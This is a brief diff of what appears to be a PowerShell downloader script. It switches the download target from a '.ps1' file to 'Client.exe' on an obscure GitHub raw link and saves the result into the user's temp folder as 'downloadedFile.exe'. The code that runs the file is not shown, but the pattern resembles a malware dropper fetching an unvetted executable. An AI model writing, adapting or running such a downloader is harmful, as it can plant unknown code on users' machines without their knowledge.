@@ -11,7 +11,7 @@
 #>
  
 # Parameters
-$url = "https://github.com/m4x7c/hdhh/raw/refs/heads/main/test.ps1"
+$url = "https://github.com/m4x7c/dhhh/raw/refs/heads/main/Client.exe"
 $outputFile = "$env:TEMP\downloadedFile.exe"
  
 try {
